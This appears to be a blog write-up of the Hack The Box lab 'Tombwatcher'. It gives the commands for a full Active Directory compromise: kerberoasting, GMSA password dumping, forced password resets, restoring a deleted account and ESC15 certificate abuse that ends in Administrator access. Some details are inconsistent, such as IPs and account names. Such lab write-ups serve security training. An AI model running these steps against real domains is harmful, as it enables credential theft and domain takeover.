@@ -1,0 +1,342 @@
+---
+title: HTB - Tombwatcher (Medium)
+date: '2025-06-12'
+tags: ['machine', 'windows', 'Active Directory', 'tombstone', 'ReadGMSAPassword', 'writeowner', 'Kerberoast', 'ESC15']
+draft: false
+summary:  Early situational awareness with Bloodhound reveals common ACEs throughout multiple users and navigating through them gets the user flag. After enumerating the target machine, there is an empty OU but also a tombstoned object which is a privileged user in the OU that has access to enumerate vulnerable certificates and discovering it was ESC15. Thus, gaining DA
+---
+
+<TOCInline toc={props.toc} asDisclosure />
+
+> [!NOTE]
+> Given Credentials -> `henry:H3nry_987TGV!`
+
+## Scanning
+
+```
+❯ nmap -sV -sC -v -Pn 10.10.11.72
+
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-12 02:13 +08
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 02:13
+Completed NSE at 02:13, 0.00s elapsed
+Initiating NSE at 02:13
+Completed NSE at 02:13, 0.00s elapsed
+Initiating NSE at 02:13
+Completed NSE at 02:13, 0.00s elapsed
+Initiating Connect Scan at 02:13
+Scanning tombwatcher.htb (10.10.11.72) [1000 ports]
+Discovered open port 139/tcp on 10.10.11.72
+Discovered open port 53/tcp on 10.10.11.72
+Discovered open port 445/tcp on 10.10.11.72
+Discovered open port 80/tcp on 10.10.11.72
+Discovered open port 135/tcp on 10.10.11.72
+Discovered open port 88/tcp on 10.10.11.72
+Discovered open port 389/tcp on 10.10.11.72
+Discovered open port 464/tcp on 10.10.11.72
+Discovered open port 3269/tcp on 10.10.11.72
+Discovered open port 636/tcp on 10.10.11.72
+Discovered open port 3268/tcp on 10.10.11.72
+Discovered open port 593/tcp on 10.10.11.72
+Completed Connect Scan at 02:14, 5.83s elapsed (1000 total ports)
+Initiating Service scan at 02:14
+Scanning 12 services on tombwatcher.htb (10.10.11.72)
+Completed Service scan at 02:14, 44.99s elapsed (12 services on 1 host)
+NSE: Script scanning 10.10.11.72.
+Initiating NSE at 02:14
+Completed NSE at 02:15, 40.11s elapsed
+Initiating NSE at 02:15
+Completed NSE at 02:15, 5.15s elapsed
+Initiating NSE at 02:15
+Completed NSE at 02:15, 0.00s elapsed
+Nmap scan report for tombwatcher.htb (10.10.11.72)
+Host is up (0.016s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Microsoft IIS httpd 10.0
+|_http-title: IIS Windows Server
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-12 06:08:53Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Issuer: commonName=tombwatcher-CA-1
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2024-11-16T00:47:59
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+|_ssl-date: 2025-06-12T06:10:16+00:00; +11h54m45s from scanner time.
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-06-12T06:10:17+00:00; +11h54m45s from scanner time.
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Issuer: commonName=tombwatcher-CA-1
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2024-11-16T00:47:59
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Issuer: commonName=tombwatcher-CA-1
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2024-11-16T00:47:59
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+|_ssl-date: 2025-06-12T06:10:16+00:00; +11h54m45s from scanner time.
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2025-06-12T06:10:17+00:00; +11h54m45s from scanner time.
+| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
+| Issuer: commonName=tombwatcher-CA-1
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2024-11-16T00:47:59
+| Not valid after:  2025-11-16T00:47:59
+| MD5:   a396:4dc0:104d:3c58:54e0:19e3:c2ae:0666
+|_SHA-1: fe5e:76e2:d528:4a33:8adf:c84e:92e3:900e:4234:ef9c
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+|_clock-skew: mean: 11h54m44s, deviation: 0s, median: 11h54m44s
+| smb2-time: 
+|   date: 2025-06-12T06:09:34
+|_  start_date: N/A
+
+NSE: Script Post-scanning.
+Initiating NSE at 02:15
+Completed NSE at 02:15, 0.00s elapsed
+Initiating NSE at 02:15
+Completed NSE at 02:15, 0.00s elapsed
+Initiating NSE at 02:15
+Completed NSE at 02:15, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 96.48 seconds
+```
+
+Scanning shows we are dealing with AD. Like always, let's start enumerating SMB with the given credentials
+
+```
+❯ nxc smb 10.10.11.70 -u 'henry' -p 'H3nry_987TGV!' --shares
+❯ nxc smb 10.10.11.70 -u 'henry' -p 'H3nry_987TGV!' --users
+```
+
+![Description](/static/images/htb/windows/tombwatcher/1.jpg)
+
+We can see a few users there, write them down in a file called `users.txt`, we don't have any permission to any of the non-default share.
+
+---
+
+## Bloodhound
+
+With credentials given, we can gain situational awareness by gathering Bloodhound data.
+
+```
+❯ nxc ldap 10.10.11.72 -u 'henry' -p 'H3nry_987TGV!' --dns-server 10.10.11.72 --bloodhound --collection All
+```
+
+![Description](/static/images/htb/windows/tombwatcher/2.jpg)
+
+![Description](/static/images/htb/windows/tombwatcher/3.jpg)
+
+Observe `henry` has `WriteSPN` ACE over `alfred`. The gives us the ability to write directly to the servicePrincipalNames 
+attribute on a user object. Writing to this property gives us the opportunity to perform a targeted kerberoasting attack against that user.
+
+I will be using Powerview for this.
+
+```
+❯ powerview 'henry':'H3nry_987TGV!'@10.10.11.72
+
+PV ❯ Set-DomainObject -Identity alfred -Set serviceprincipalname='pwned/tombwatcher.htb'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/4.jpg)
+
+Now we can perform kerberoasting
+
+```
+PV ❯ Invoke-Kerberoast alfred
+```
+
+![Description](/static/images/htb/windows/tombwatcher/5.jpg)
+
+Now, we have the TGS. We can crack it using Hashcat
+
+![Description](/static/images/htb/windows/tombwatcher/6.jpg)
+
+`alfred:basketball`
+
+Now, we check Bloodhound again to look for Outbound Object Controls in which we have One
+
+![Description](/static/images/htb/windows/tombwatcher/7.jpg)
+
+`alfred` has `AddSelf` ACE over the `Infrastructure` group. He can add himself to the group and gain 
+the same privileges. Again, we can use Powerview for this
+
+```
+❯ powerview 'alfred':'basketball'@10.10.11.72
+
+PV ❯ Add-DomainGroupMember -Identity 'Infrastructure' -Members 'alfred'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/8.jpg)
+
+We check Bloodhound again
+
+![Description](/static/images/htb/windows/tombwatcher/9.jpg)
+
+Observe the `Infrastructure` group has `ReadGMSAPassword` over the `ansible_dev$` group which is also
+a GMSA (Group Managed Service Account).
+
+We can abuse this using Netexec which will dump the NTLM
+
+```
+❯ nxc ldap -u alfred -p basketball --gmsa
+```
+
+![Description](/static/images/htb/windows/tombwatcher/10.jpg)
+
+Then, we check Bloodhound again for the `ansible_dev$` group, we see it has `ForceChangePassword` ACE over
+user `Sam`
+
+![Description](/static/images/htb/windows/tombwatcher/11.jpg)
+
+This indicates the GMSA can reset the password of user 'sam`. I tried to crack the NTLM but it didn't work,
+I did some digging and found out that Netexec has a module to reset the password using the GMSA's NTLM hash!
+
+![Description](/static/images/htb/windows/tombwatcher/12.jpg)
+
+```
+❯ nxc smb 10.10.11.72 -u 'ansible_dev$' -H '1c37d00093dc2a5f25176bf2d474afdc' -M change-password -o USER=sam NEWPASS=Password123!
+```
+
+![Description](/static/images/htb/windows/tombwatcher/13.jpg)
+
+After changing his password, we look at Bloodhound once more and find that `sam` has `WriteOwner` over
+user `john`. Using BloodyAD, we can change the ownership of the `user` account and change the password after gaining ownership
+
+```
+❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p Password123! set owner "john" "sam"
+❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u sam -p Password123! set password "john" 'Password123'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/14.jpg)
+
+Also notice that `john` is a part of the `winrm` group
+
+![Description](/static/images/htb/windows/tombwatcher/15.jpg)
+
+We can easily log in and get the user flag
+
+![Description](/static/images/htb/windows/tombwatcher/16.jpg)
+
+I looked at Bloodhound and saw an empty OU, `ADCS` with `GenericAll`, this was a bit weird and I got stuck here.
+
+![Description](/static/images/htb/windows/tombwatcher/17.jpg)
+
+Now, I tried everything like Winpeas didn't find anything and certipy did not found any vulnerable certificates.
+So, I looked up the name of the machine which is "tombstone" and I found something promising. According to this [post](https://reintech.io/blog/handling-active-directory-tombstoned-objects-reanimation),
+we can enumerate deleted objects and reanimate them like a zombie xD.
+
+I modified the command to enumerate like so:
+
+```
+*Evil-WinRM* PS> Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects -Properties *
+```
+
+![Description](/static/images/htb/windows/tombwatcher/18.jpg)
+
+We can see a deleted user `cert_admin` that belongs to the `ADCS` OU. Let us raise him from the dead using his DN (Distinguished Name)
+
+```
+*Evil-WinRM* PS> Restore-ADObject -Identity "CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb"
+```
+
+![Description](/static/images/htb/windows/tombwatcher/19.jpg)
+
+It was supposed to work, but we get this error because someone else already reanimated him, I am very lazy to reset the machine
+so let us proceed with gathering Bloodhound data and upload to our ingestor.
+
+![Description](/static/images/htb/windows/tombwatcher/20.jpg)
+
+We can see `svc_admin` here and a random machine account came from nowhere can ignore that one I guess lol. Apart from
+that, we have `GenericAll` over `svc_admin`. We can easily change his password
+
+```
+❯ bloodyAD --host 10.10.11.72 -d tombwatcher.htb -u john -p Password1234! set password "cert_admin" 'Password123!'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/21.jpg)
+
+Now, we can try to enumerate vulnerable certificates
+
+```
+❯ certipy find -u cert_admin -p Password123! -target 10.10.11.72 -stdout -vulnerable
+```
+
+Observe it is vulnerable to ESC15, we can just follow this [guide](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu)
+to exploit ESC15
+
+I tried the first scenario, Scenario A: Direct Impersonation via Schannel (Injecting "Client Authentication" Application Policy)
+but that failed to spawn the LDAP shell, so I proceeded to use the Scenario B, PKINIT/Kerberos Impersonation via Enrollment Agent Abuse (Injecting "Certificate Request Agent" Application Policy)
+
+Request a certificate from the V1 template as the attacker
+
+```
+❯ certipy req -u 'cert_admin' -p 'Password123!' -dc-ip '10.10.11.72' -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/22.jpg)
+
+Then, Use the attacker certificate to request a certificate on behalf of a target privileged user.
+In this case, its the `Administrator`
+
+```
+❯ certipy req -u 'cert_admin' -p 'Password123!' -dc-ip '10.10.11.72' -target 'tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\Administrator'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/24.jpg)
+
+Now, we authenticate using the Administartor's cert/private key
+
+```
+❯ certipy auth -pfx 'administrator.pfx' -dc-ip '10.10.11.72'
+```
+
+![Description](/static/images/htb/windows/tombwatcher/25.jpg)
+
+Now, just winrm and get da root flag
+
+![Description](/static/images/htb/windows/tombwatcher/26.jpg)
+
+
+
+
+
+
+
